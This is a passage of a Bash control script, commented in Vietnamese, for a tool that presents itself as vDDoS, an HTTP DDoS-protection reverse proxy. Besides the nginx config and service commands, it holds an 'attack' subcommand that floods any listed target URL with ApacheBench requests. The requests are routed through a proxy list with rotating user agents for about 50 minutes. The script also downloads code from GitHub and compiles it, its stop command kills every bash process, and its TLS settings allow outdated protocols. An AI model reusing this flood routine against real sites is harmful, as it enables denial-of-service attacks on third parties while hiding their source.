    proxy_set_header    X-Real-IP       $remote_addr;
    proxy_set_header    X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_pass_header   Set-Cookie;
    proxy_connect_timeout   90;
    proxy_send_timeout  90;
    proxy_read_timeout  90;
    proxy_buffers       32 4k;
    proxy_ssl_session_reuse off;

    # SSL PCI Compliance
    ssl_session_cache   shared:SSL:10m;
    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;
    ssl_prefer_server_ciphers on;
    ssl_ciphers        "ECDHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES128-GCM-SHA256:DHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA:ECDHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA:DHE-RSA-AES128-SHA:ECDHE-RSA-DES-CBC3-SHA:EDH-RSA-DES-CBC3-SHA:AES256-GCM-SHA384:AES128-GCM-SHA256:AES256-SHA256:AES128-SHA256:AES256-SHA:AES128-SHA:DES-CBC3-SHA:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!MD5:!PSK:!RC4";


    # Error pages
    error_page          403          /error/403.html;
    error_page          404          /error/404.html;
    error_page  400 401 402 405 406 407 408 409 410 411 412 413 414 415 416 417 418 421 422 423 424 426 428 429 431 451 /error/4xx.html;
    error_page  500 501 502 503 504 505 506 507 508 510 511 /error/5xx.html;


    # Cache
    proxy_cache_path /var/cache/vddos levels=2 keys_zone=cache:10m inactive=60m max_size=512m;
    proxy_temp_path  /var/cache/vddos/temp;
    proxy_cache_key "$host$request_uri $cookie_user";
    proxy_ignore_headers Expires Cache-Control;
    proxy_cache_use_stale error timeout invalid_header http_502;
    proxy_cache_valid any 3d;

    map $http_cookie $no_cache {
        default 0;
        ~SESS 1;
        ~wordpress_logged_in 1;
    }
    map $status $statusblock {
        444  1;
        default 0;
    }
    map $status $statusnormal {
        #444  0;
        default 1;
    }
    # Wildcard include
    include             /vddos/conf.d/load-balancing.conf;
	include             /vddos/conf.d/logs.conf;
    include             /vddos/conf.d/*.vddos.conf;
}
include             /vddos/conf.d/tcp-udp-proxy.conf;
	' > /vddos/vddos.conf


	# Xóa một số thứ (sau khi tạo xong file cấu hình như trên, vẫn chưa được áp dụng, xóa bây giờ và restart vDDoS nên những thư sau sẽ lại được sinh ra)
	rm -rf /var/cache/vddos/*-cache-*  # Xóa cache cũ, sẽ sinh ra lại theo cấu hình mới sau khi restart vDDoS
	rm -rf /var/cache/vddos/*-temp-*   # Xóa cache cũ, sẽ sinh ra lại theo cấu hình mới sau khi restart vDDoS
	rm -rf /var/log/vddos/* 	# Xóa log cũ, sẽ sinh ra lại theo cấu hình mới sau khi restart vDDoS
	
	return 0
}






################## Nếu gõ "vddos start"
if [ $lenh == "start" ]; then
	checknoninstallvddos
	checkfilewebsiteconf
	makefileconf
	restartcaptchaserver  >/dev/null 2>&1
	sleep 3 ; /vddos/vddos
	checkDefensiveAbilityvddos
	echo '(Defensive Estimating ~ '$DefensiveAbility' RealReq/s)'
	sleep 0; netstat -lntup|grep nginx | awk {'print $4'}
	sleep 3
	deletefileconf
	echo 'vDDos service Restart success!'

	exit 0
fi

################## Nếu gõ "vddos stop"
if [ $lenh == "stop" ]; then
	
	checknoninstallvddos
	checkfilewebsiteconf
	makefileconf
	stopcaptchaserver  >/dev/null 2>&1 # Giết captcha server
	/vddos/vddos -s stop   >/dev/null 2>&1 # Giết vddos
	
	deletefileconf
	echo 'vDDos service Stop success!'
	exit 0
fi

################## Nếu gõ "vddos restart"
if [ $lenh == "restart" ]; then
	
	checknoninstallvddos
	checkfilewebsiteconf
	makefileconf
	restartcaptchaserver  >/dev/null 2>&1

	/vddos/vddos -s stop   >/dev/null 2>&1 # Giết vddos
	sleep 3
	/vddos/vddos   >/dev/null 2>&1 # Chạy vddos

	checkDefensiveAbilityvddos
	echo '(Defensive Estimating ~ '$DefensiveAbility' RealReq/s)'
	sleep 0; netstat -lntup|grep nginx | awk {'print $4'}
	sleep 3
	deletefileconf
	echo 'vDDos service Restart success!'
	
	exit 0
fi

################## Nếu gõ "vddos autostart"
if [ $lenh == "autostart" ]; then
	checknoninstallvddos
	yum -y install cronie  >/dev/null 2>&1
	deletelich='vddos'
	sed -i "s/.*$deletelich.*//" /etc/crontab  >/dev/null 2>&1
	deletelich='@reboot root sleep 10 && /usr/bin/vddos start'
	sed -i "s/.*$deletelich.*//" /etc/crontab  >/dev/null 2>&1
	echo '@reboot root sleep 10 && /usr/bin/vddos start' | sudo tee --append /etc/crontab  >/dev/null 2>&1
	deletelich='@weekly root /usr/bin/vddos stop && sleep 5 && /usr/bin/vddos start'
	sed -i "s/.*$deletelich.*//" /etc/crontab  >/dev/null 2>&1
	echo '@weekly root /usr/bin/vddos stop && sleep 5 && /usr/bin/vddos start' | sudo tee --append /etc/crontab  >/dev/null 2>&1
	echo 'vDDos service Auto-start success!'
	exit 0
fi

################## Nếu gõ "vddos attack"
if [ $lenh == "attack" ]; then
	

	# Nếu không có ab thì cài
	if [ ! -f /usr/bin/ab ]; then
		yum -y install nano net-tools curl gcc apr-util-devel gc gcc gcc-c++ pcre-devel zlib-devel make wget openssl-devel libxml2-devel libxslt-devel gd-devel perl-ExtUtils-Embed GeoIP-devel gperftools gperftools-devel libatomic_ops-devel perl-ExtUtils-Embed  >/dev/null 2>&1
		cd $HOME   >/dev/null 2>&1
		curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/ab.zip -o ab.zip  --silent
		unzip ab.zip   >/dev/null 2>&1
		rm -rf ab.zip   >/dev/null 2>&1
		cd ApacheBench-standalone-master/   >/dev/null 2>&1
		make   >/dev/null 2>&1
		make install   >/dev/null 2>&1
		cd $HOME   >/dev/null 2>&1
		rm -rf ApacheBench-standalone-master/   >/dev/null 2>&1
		if [ ! -f /usr/bin/ab ]; then
			yum -y install httpd*   >/dev/null 2>&1
		fi
		if [ ! -f /usr/bin/ab ]; then
			echo 'ERROR! vDDoS attack service can not installed!'
			exit 0
		fi
	fi

	# Nếu có /vddos/attack và có target-list.txt *.txt đầy đủ
	if [ -d /vddos/attack ]; then

		if [ -f /vddos/attack/target-list.txt ]; then
		echo '/vddos/attack/target-list.txt ====> OK!'
			if [ -f /vddos/attack/proxy-list.txt ]; then
			echo '/vddos/attack/proxy-list.txt ====> OK!'
				if [ -f /vddos/attack/useragent-list.txt ]; then
				echo '/vddos/attack/useragent-list.txt ====> OK!'

					echo -n 'Please Enter number connection per second for one proxy [default 5]: '
					read numberconnection
					if [ $numberconnection="" ]; then
						numberconnection=5
					fi
					
					ten_file_chua_list="/vddos/attack/useragent-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					ten_file_chua_list="/vddos/attack/proxy-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					ten_file_chua_list="/vddos/attack/target-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					danh_sach_muc_tieu='/vddos/attack/target-list.txt'
					thoi_gian_cuoc_tan_cong_se_ket_thuc=3000
					thoi_gian_nghi_giua_moi_lan_bash=10
					so_ket_noi_tren_moi_giay_cua_bash="$numberconnection"
					tong_so_ket_noi_can_gui_cua_bash="$numberconnection"

					danh_sach_proxy='/vddos/attack/proxy-list.txt'
					so_dong_file_chua_proxy=`cat $danh_sach_proxy | grep . | wc -l`
					so_dong_bat_dau_tim=1
					tong_so_bash=$so_dong_file_chua_proxy

					danh_sach_user_agents='/vddos/attack/useragent-list.txt'

					dong=$so_dong_bat_dau_tim
					while [ $dong -le $so_dong_file_chua_proxy ]
					do
					proxy_dang_dung=$(awk " NR == $dong " $danh_sach_proxy)
					muc_tieu=$(shuf -n 1 $danh_sach_muc_tieu)
					user_agents=$(shuf -n 1 $danh_sach_user_agents)

					while :; do sleep $thoi_gian_nghi_giua_moi_lan_bash; ab -H "User-Agent: $user_agents" -c $so_ket_noi_tren_moi_giay_cua_bash -n $tong_so_ket_noi_can_gui_cua_bash -X $proxy_dang_dung     $muc_tieu ;  done &

					echo "Call Success Proxy Server in line: $dong, $proxy_dang_dung"
					dong=$((dong + 1))

					done
					echo "Call All Success Proxy Server: $so_dong_file_chua_proxy Proxy in file $danh_sach_proxy"
					sleep $thoi_gian_cuoc_tan_cong_se_ket_thuc && killall ab && killall bash
					exit 0
				fi
				
			fi
			
		fi

	fi

	# Nếu có $HOME/attack và có target-list.txt *.txt đầy đủ
	if [ -d $HOME/attack ]; then

		if [ -f $HOME/attack/target-list.txt ]; then
		echo ''$HOME'/attack/target-list.txt ====> OK!'
			if [ -f $HOME/attack/proxy-list.txt ]; then
			echo ''$HOME'/attack/proxy-list.txt ====> OK!'
				if [ -f $HOME/attack/useragent-list.txt ]; then
				echo ''$HOME'/attack/useragent-list.txt ====> OK!'

					echo -n 'Please Enter number connection per second for one proxy [default 5]: '
					read numberconnection
					if [ $numberconnection="" ]; then
						numberconnection=5
					fi
					ten_file_chua_list="$HOME/attack/useragent-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					ten_file_chua_list="$HOME/attack/proxy-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					ten_file_chua_list="$HOME/attack/target-list.txt"
					echo "`cat $ten_file_chua_list | grep .`" > $ten_file_chua_list

					danh_sach_muc_tieu="$HOME/attack/target-list.txt"
					thoi_gian_cuoc_tan_cong_se_ket_thuc=3000
					thoi_gian_nghi_giua_moi_lan_bash=10
					so_ket_noi_tren_moi_giay_cua_bash="$numberconnection"
					tong_so_ket_noi_can_gui_cua_bash="$numberconnection"

					danh_sach_proxy="$HOME/attack/proxy-list.txt"
					so_dong_file_chua_proxy=`cat $danh_sach_proxy | grep . | wc -l`
					so_dong_bat_dau_tim=1
					tong_so_bash=$so_dong_file_chua_proxy

					danh_sach_user_agents="$HOME/attack/useragent-list.txt"

					dong=$so_dong_bat_dau_tim
					while [ $dong -le $so_dong_file_chua_proxy ]
					do
					proxy_dang_dung=$(awk " NR == $dong " $danh_sach_proxy)
					muc_tieu=$(shuf -n 1 $danh_sach_muc_tieu)
					user_agents=$(shuf -n 1 $danh_sach_user_agents)

					while :; do sleep $thoi_gian_nghi_giua_moi_lan_bash; ab -H "User-Agent: $user_agents" -c $so_ket_noi_tren_moi_giay_cua_bash -n $tong_so_ket_noi_can_gui_cua_bash -X $proxy_dang_dung     $muc_tieu ;  done &

					echo "Call Success Proxy Server in line: $dong, $proxy_dang_dung"
					dong=$((dong + 1))

					done
					echo "Call All Success Proxy Server: $so_dong_file_chua_proxy Proxy in file $danh_sach_proxy"
					sleep $thoi_gian_cuoc_tan_cong_se_ket_thuc && killall ab && killall bash
					exit 0
				fi
				
			fi
			
		fi

	fi

	# Nếu có /vddos/attack nhưng không có target-list.txt
	if [ -d /vddos/attack ]; then

		if [ ! -f /vddos/attack/target-list.txt ]; then

			
			mkdir -p /vddos/attack
			touch /vddos/attack/target-list.txt; echo 'http://example.com:80/index.html' > /vddos/attack/target-list.txt
			touch /vddos/attack/proxy-list.txt; echo '123.123.123.123:8080' > /vddos/attack/proxy-list.txt
			touch /vddos/attack/useragent-list.txt
			curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/user-agents1.txt -o /vddos/attack/useragent-list.txt --silent
			echo 'Please input Target list Website to /vddos/attack/target-list.txt
Please input Proxy list Server to /vddos/attack/proxy-list.txt
Please input User-agent list to /vddos/attack/useragent-list.txt

Run "vddos attack" command again to create a DoS attacks to HTTP target!
			'
			exit 0
		fi


	fi



	# Nếu không có $HOME/attack và cũng không có /vddos/attack
	if [ ! -d $HOME/attack ]; then

		if [ ! -d /vddos/attack ]; then

			mkdir -p $HOME/attack
			touch $HOME/attack/target-list.txt; echo 'http://example.com:80/index.html' > $HOME/attack/target-list.txt
			touch $HOME/attack/proxy-list.txt; echo '123.123.123.123:8080' > $HOME/attack/proxy-list.txt
			touch $HOME/attack/useragent-list.txt
			curl -L https://raw.githubusercontent.com/duy13/vDDoS-Protection/master/user-agents1.txt -o $HOME/attack/useragent-list.txt --silent
			echo 'Please input Target Website to '$HOME'/attack/target-list.txt
Please input Proxy Server to '$HOME'/attack/proxy-list.txt
Please input User-agent list to '$HOME'/attack/useragent-list.txt

Run "vddos attack" command again to create a DoS attacks to HTTP target!
			'

		fi

	fi




	exit 0
fi



################## Nếu gõ "vddos stopattack"
if [ $lenh == "stopattack" ]; then
	killall curl  >/dev/null 2>&1
	killall ab  >/dev/null 2>&1
	killall bash  >/dev/null 2>&1

	echo 'vDDos attack stop success!
	'
	exit 0
fi


################## Nếu gõ "vddos help" hoặc không có lệnh cụ thể setup|start|stop|restart
lenh="help" #buộc lệnh là vào help
if [ $lenh == "help" ]; then
	clear
	echo '
   Welcome to vDDoS, a HTTP(S) DDoS Protection Reverse Proxy. Thank you for using!

		Command Line Usage:
	vddos setup		:installing vDDoS service for the first time into /vddos
	vddos start		:start vDDoS service
	vddos stop		:stop vDDoS service
	vddos restart		:restart vDDoS service
	vddos autostart		:auto-start vDDoS services on boot
	vddos attack		:create a DDoS attacks to HTTP Server target (in 30 min)
	vddos stopattack	:stop "vddos attack" command
	vddos help		:display this help
	
					Please sure download vDDoS source from: vddos.voduy.com
	'
	exit 0
fi




